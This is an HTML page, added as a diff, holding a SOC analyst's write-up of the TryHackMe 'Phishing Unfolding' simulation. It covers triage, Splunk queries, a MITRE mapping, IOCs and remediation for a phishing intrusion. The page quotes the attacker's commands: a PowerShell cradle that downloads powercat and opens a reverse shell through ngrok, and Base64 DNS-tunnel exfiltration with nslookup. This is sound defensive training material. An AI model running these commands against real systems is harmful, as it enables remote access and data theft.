@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Unfolding (TryHackMe) - SOC Simulator Write-up</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+    
+    <style>
+        .writeup-container {
+            max-width: 800px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: var(--text-color, #ffffff);
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 140px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+        }
+        .chain-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 4px;
+            background: rgba(0, 255, 204, 0.08);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            color: var(--primary-color, #00ffcc);
+        }
+        .chain-arrow {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .flag-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+        .ioc-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 25px;
+        }
+        .ioc-table th {
+            text-align: left;
+            padding: 10px 15px;
+            border-bottom: 2px solid var(--primary-color, #00ffcc);
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        .ioc-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.82em;
+        }
+        .verdict-tp {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .verdict-fp {
+            background: rgba(255, 200, 50, 0.06);
+            border: 1px solid rgba(255, 200, 50, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #fcc419;
+        }
+        .mitre-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 25px;
+        }
+        .mitre-table th {
+            text-align: left;
+            padding: 10px 15px;
+            border-bottom: 2px solid var(--primary-color, #00ffcc);
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        .mitre-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+            font-size: 0.9em;
+        }
+        .mitre-table td:first-child {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.82em;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">← All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>SOC Simulator: Phishing Unfolding</h1>
+        
+        <table class="meta-table">
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Type</td><td>🛡️ SOC Simulator</td></tr>
+            <tr><td>Difficulty</td><td>Medium</td></tr>
+            <tr><td>Duration</td><td>~40 minutes</td></tr>
+            <tr><td>Tools</td><td>Alert Queue · Splunk SIEM · Analyst VM (TryDetectThis)</td></tr>
+            <tr><td>Tags</td><td>Phishing · PowerShell · Reverse Shell · DNS Tunneling · SIEM · Alert Triage</td></tr>
+        </table>
+
+        <h2>Scenario Overview</h2>
+        <p>This SOC simulation places you inside the Security Operations Center of <strong>TryHatMe</strong>, a fictional e-commerce company. A live, multi-stage phishing attack is unfolding against the corporate network in real time. As the on-duty SOC Analyst, your responsibilities include monitoring and triaging incoming alerts, investigating using the SIEM and Analyst VM, distinguishing true positives from false positives, reconstructing the full attack chain, and writing detailed case reports.</p>
+
+        <blockquote>
+            "A suspicious email has been received by a high-value target. The clock is ticking — triage, investigate, and document every move before the attacker completes their objective."
+        </blockquote>
+
+        <h3>Attack Chain</h3>
+        <div class="attack-chain">
+            <span class="chain-step">📧 Spearphishing Email</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">📎 Malicious LNK</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">⚡ PowerShell Execution</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🔌 Reverse Shell (ngrok)</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🔍 Reconnaissance</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">📂 Data Collection</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">📡 DNS Exfiltration</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🧹 Cleanup</span>
+        </div>
+
+        <h2>Preparation &amp; Key Assets</h2>
+        <p>Before engaging with alerts, I reviewed the <strong>Documentation tab</strong> to understand the company structure, asset inventory, and reporting expectations. The following key users and hosts were identified:</p>
+
+        <table class="ioc-table">
+            <tr><th>User</th><th>Role</th><th>Host</th><th>Email</th></tr>
+            <tr><td>Michael Ascot</td><td>CEO</td><td>win-3450</td><td>michael.ascot@tryhatme.com</td></tr>
+            <tr><td>Yani Zubair</td><td>IT</td><td>win-3449</td><td>yani.zubair@tryhatme.com</td></tr>
+            <tr><td>Michelle Smith</td><td>Legal</td><td>win-3459</td><td>michelle.smith@tryhatme.com</td></tr>
+            <tr><td>Sophie J</td><td>HR</td><td>win-3461</td><td>sophie.j@tryhatme.com</td></tr>
+        </table>
+
+        <h2>Investigation</h2>
+
+        <h3><span class="step-label">PHASE 1</span> Alert Triage — Suspicious Email Attachment</h3>
+        <p>Starting from the Dashboard, I prioritized high-severity alerts and worked through the queue. Among the initial alerts was a <strong>Suspicious Email Attachment</strong> alert (Low Severity) that warranted immediate investigation:</p>
+        <table class="meta-table">
+            <tr><td>Alert ID</td><td>~1007 / 1015</td></tr>
+            <tr><td>Datasource</td><td>emails</td></tr>
+            <tr><td>Sender</td><td>john@hatmakereurope.xyz</td></tr>
+            <tr><td>Recipient</td><td>michael.ascot@tryhatme.com</td></tr>
+            <tr><td>Subject</td><td>"Important: Pending Invoice!"</td></tr>
+            <tr><td>Attachment</td><td>ImportantInvoice-February.zip</td></tr>
+        </table>
+
+        <p><strong>Domain reputation check:</strong> Using the Analyst VM's <code>TryDetectThis</code> tool, I checked <code>hatmakereurope.xyz</code>. The domain appeared clean — however, it was a <strong>newly registered lookalike domain</strong> designed to impersonate a legitimate business partner. Domain reputation alone is insufficient; the timing, context, and attachment content must be evaluated.</p>
+
+        <p><strong>Attachment analysis:</strong> I extracted the ZIP archive on the Analyst VM. Inside was a file named <code>invoice.pdf.lnk</code> — not a real PDF, but a <strong>Windows shortcut file</strong> (LNK) masquerading as a document. This is a classic malware delivery technique that exploits Windows' default behavior of hiding file extensions.</p>
+
+        <p>Examining the LNK target revealed a <strong>malicious PowerShell one-liner</strong>:</p>
+        <pre>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(
+  'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'
+); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"</pre>
+        <p>This payload performs two critical actions:</p>
+        <ul>
+            <li><strong>Downloads <code>powercat.ps1</code></strong> — a PowerShell implementation of Netcat — from a public GitHub repository.</li>
+            <li><strong>Establishes a reverse shell</strong> back to the attacker's C2 infrastructure at <code>2.tcp.ngrok.io:19282</code>, tunneled through ngrok to obscure the attacker's true IP.</li>
+        </ul>
+        <div class="verdict-tp">
+            ⚠️ VERDICT: True Positive — Spearphishing attachment delivering a PowerShell reverse shell via malicious LNK file.
+        </div>
+
+        <h3><span class="step-label">PHASE 2</span> SIEM Deep Dive — Process Activity on win-3450</h3>
+        <p>Multiple <strong>high-severity alerts</strong> fired for suspicious parent-child process relationships on host <code>win-3450</code> (Michael Ascot's workstation). I pivoted to Splunk to correlate the activity.</p>
+
+        <p><strong>Key SIEM queries:</strong></p>
+        <pre>index=* host=win-3450
+index=* process.parent.name=powershell.exe
+index=* process.name=nslookup.exe
+index=* "exfiltration"
+index=* "powercat" OR "PowerView"</pre>
+
+        <p>The logs painted a clear picture of post-exploitation activity, all spawned under <code>powershell.exe</code> as the parent process:</p>
+
+        <h3><span class="step-label">PHASE 3</span> Initial Execution &amp; Reconnaissance</h3>
+        <p>The execution chain began when Outlook downloaded the attachment, Explorer extracted the ZIP, and the user double-clicked the disguised LNK file. This spawned PowerShell, which downloaded and executed <code>powercat.ps1</code> to establish the reverse shell.</p>
+
+        <p>With shell access, the attacker immediately began reconnaissance:</p>
+        <pre># System & user enumeration
+whoami
+systeminfo
+
+# Active Directory reconnaissance
+IEX(New-Object Net.WebClient).DownloadString('...PowerView.ps1')
+</pre>
+        <p>The attacker downloaded and executed <code>PowerView.ps1</code>, a well-known Active Directory enumeration tool from the PowerSploit framework, to map the internal network and identify high-value targets.</p>
+        <div class="success-box">
+            ✓ Confirmed — PowerShell spawning whoami, systeminfo, and loading PowerView.ps1 from win-3450.
+        </div>
+
+        <h3><span class="step-label">PHASE 4</span> Data Collection &amp; Staging</h3>
+        <p>The attacker created a staging directory and mapped a network share to access sensitive financial documents:</p>
+        <pre># Create staging directory
+mkdir C:\Users\michael.ascot\Downloads\exfiltration
+
+# Map network share
+net use Z: \\FILESRV-01\SSF-FinancialRecords
+
+# Copy sensitive files
+robocopy Z:\ C:\Users\michael.ascot\Downloads\exfiltration\ 
+    InvestorPresentation2023.pptx
+    ClientPortfolioSummary.xlsx</pre>
+        <p>The attacker used <code>robocopy</code> — a legitimate Windows utility — to copy financial documents from the <code>FILESRV-01</code> file server into the local staging directory. The targeted files (<code>InvestorPresentation2023.pptx</code> and <code>ClientPortfolioSummary.xlsx</code>) indicate the attacker had specific intelligence about the organization's data structure.</p>
+        <div class="denied-box">
+            ⚠ Critical — Sensitive financial data accessed and staged for exfiltration from \\FILESRV-01\SSF-FinancialRecords.
+        </div>
+
+        <h3><span class="step-label">PHASE 5</span> Exfiltration via DNS Tunneling</h3>
+        <p>Rather than exfiltrating data over HTTP/S (which would likely be caught by proxy/DLP controls), the attacker employed <strong>DNS tunneling</strong> — a covert channel technique that encodes data within DNS queries:</p>
+        <pre># Compress and encode stolen data
+Compress-Archive ... -DestinationPath exfilt8me.zip
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('exfilt8me.zip'))
+
+# Exfiltrate via DNS queries in chunks
+nslookup &lt;base64-chunk-1&gt;.haz4rdw4re.io
+nslookup &lt;base64-chunk-2&gt;.haz4rdw4re.io
+nslookup &lt;base64-chunk-3&gt;.haz4rdw4re.io
+...</pre>
+        <p>Each DNS query encodes a chunk of Base64-encoded data as a subdomain of the attacker-controlled domain <code>haz4rdw4re.io</code>. On the attacker's authoritative DNS server, these queries are reassembled into the original file. This technique is effective because DNS traffic is rarely inspected by traditional security controls.</p>
+        <div class="denied-box">
+            ⚠ Critical — Data exfiltrated via DNS tunneling to haz4rdw4re.io using nslookup as the transport mechanism.
+        </div>
+
+        <h3><span class="step-label">PHASE 6</span> Cleanup &amp; Anti-Forensics</h3>
+        <p>After completing the exfiltration, the attacker disconnected the mapped network share to reduce their forensic footprint:</p>
+        <pre>net use Z: /delete</pre>
+        <p>This attempt at indicator removal is a common post-exploitation practice, though the activity was already captured in the SIEM logs.</p>
+
+        <h3><span class="step-label">PHASE 7</span> False Positive Triage</h3>
+        <p>Not all alerts were malicious. An alert related to <strong>Yani Zubair</strong> (IT department) flagged a PowerShell script attachment named <code>forceupdate.ps1</code>. Upon analysis, this was a <strong>legitimate Windows update and system diagnostics script</strong> used internally by IT, which sends reports back to the IT account.</p>
+        <div class="verdict-fp">
+            ℹ VERDICT: False Positive — Legitimate IT automation script for Windows updates and system diagnostics.
+        </div>
+
+        <h2>MITRE ATT&amp;CK Mapping</h2>
+        <table class="mitre-table">
+            <tr><th>Tactic</th><th>Technique</th><th>Details</th></tr>
+            <tr><td>Initial Access</td><td>T1566.001 — Spearphishing Attachment</td><td>Malicious LNK inside ZIP emailed to CEO</td></tr>
+            <tr><td>Execution</td><td>T1059.001 — PowerShell</td><td>Downloads and executes powercat.ps1</td></tr>
+            <tr><td>Command & Control</td><td>T1219 — Remote Access Tools</td><td>Reverse shell via ngrok (2.tcp.ngrok.io:19282)</td></tr>
+            <tr><td>Discovery</td><td>T1033 / T1082 — System & Account Discovery</td><td>whoami, systeminfo, PowerView.ps1</td></tr>
+            <tr><td>Collection</td><td>T1039 — Data from Network Shared Drive</td><td>Mapped share + robocopy of financial documents</td></tr>
+            <tr><td>Exfiltration</td><td>T1048.003 — Exfil Over Alternative Protocol</td><td>Base64-encoded DNS queries to haz4rdw4re.io</td></tr>
+            <tr><td>Defense Evasion</td><td>T1070 — Indicator Removal</td><td>Disconnected mapped network share</td></tr>
+        </table>
+
+        <h2>Indicators of Compromise</h2>
+        <table class="ioc-table">
+            <tr><th>Type</th><th>Indicator</th><th>Context</th></tr>
+            <tr><td>Domain</td><td>hatmakereurope.xyz</td><td>Phishing sender domain</td></tr>
+            <tr><td>Domain</td><td>2.tcp.ngrok.io</td><td>C2 reverse shell endpoint</td></tr>
+            <tr><td>Domain</td><td>haz4rdw4re.io</td><td>DNS tunneling exfiltration</td></tr>
+            <tr><td>URL</td><td>raw.githubusercontent.com/.../powercat.ps1</td><td>Payload download</td></tr>
+            <tr><td>File</td><td>ImportantInvoice-February.zip</td><td>Phishing attachment</td></tr>
+            <tr><td>File</td><td>invoice.pdf.lnk</td><td>Malicious shortcut</td></tr>
+            <tr><td>File</td><td>powercat.ps1</td><td>Reverse shell tool</td></tr>
+            <tr><td>File</td><td>PowerView.ps1</td><td>AD reconnaissance tool</td></tr>
+            <tr><td>File</td><td>exfilt8me.zip</td><td>Staged exfiltration archive</td></tr>
+            <tr><td>Host</td><td>win-3450</td><td>Compromised endpoint</td></tr>
+            <tr><td>User</td><td>michael.ascot</td><td>Compromised account</td></tr>
+            <tr><td>Share</td><td>\\FILESRV-01\SSF-FinancialRecords</td><td>Accessed network share</td></tr>
+        </table>
+
+        <h2>Recommended Remediation</h2>
+        <ul>
+            <li><strong>Isolate <code>win-3450</code></strong> — Immediately disconnect the host from the network to prevent further lateral movement or data exfiltration.</li>
+            <li><strong>Reset credentials</strong> — Force a password reset for <code>michael.ascot</code> and any accounts that accessed <code>FILESRV-01</code>.</li>
+            <li><strong>Block IOCs</strong> — Add all identified domains, URLs, and file hashes to firewall, proxy, and email gateway blocklists.</li>
+            <li><strong>Threat hunt</strong> — Search for similar LNK attachments, PowerShell download cradles, and DNS tunneling patterns across the environment.</li>
+            <li><strong>Review share permissions</strong> — Audit access controls on <code>FILESRV-01</code> and restrict financial records to need-to-know access.</li>
+            <li><strong>DNS monitoring</strong> — Implement DNS query length and frequency anomaly detection to catch tunneling attempts.</li>
+            <li><strong>User awareness training</strong> — Conduct targeted training on invoice-themed phishing and LNK file risks, especially for executive staff.</li>
+        </ul>
+
+        <h2>Key Takeaways</h2>
+
+        <div class="takeaway-card">
+            <h4>🎣 Low-Severity Alerts Can Be High-Impact</h4>
+            <p>The initial phishing email was flagged as low severity. A hasty analyst could have dismissed it. The domain appeared clean, and the attachment name looked benign. Always investigate email alerts in full context — examine the attachment, not just the metadata.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🔗 Reconstruct the Kill Chain, Don't Triage in Isolation</h4>
+            <p>Individual alerts (process creation, network access, DNS queries) may seem unrelated. The real skill is correlating them into a single attack narrative: phishing → execution → C2 → recon → collection → exfiltration → cleanup. This is what separates an alert processor from a threat analyst.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>📡 DNS Is a Blind Spot</h4>
+            <p>DNS tunneling via <code>nslookup</code> is a powerful exfiltration method because DNS traffic is rarely inspected by DLP or proxy controls. Organizations should monitor for abnormal DNS query patterns: excessive query lengths, high query volumes to a single domain, and Base64-encoded subdomains.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🏠 Living-Off-the-Land Is Hard to Detect</h4>
+            <p>Every tool the attacker used — <code>powershell.exe</code>, <code>nslookup.exe</code>, <code>robocopy.exe</code>, <code>net.exe</code> — is a legitimate Windows binary. This makes signature-based detection ineffective. Behavioral analysis and parent-child process relationship monitoring are essential for catching LOLBin abuse.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>✍️ Professional Case Reporting Matters</h4>
+            <p>In a real SOC, your case report is the deliverable. It needs to clearly communicate the timeline, affected entities, classification rationale, and remediation steps. A well-written report accelerates incident response and provides the evidence trail for post-incident review.</p>
+        </div>
+    </main>
+</body>
+</html>
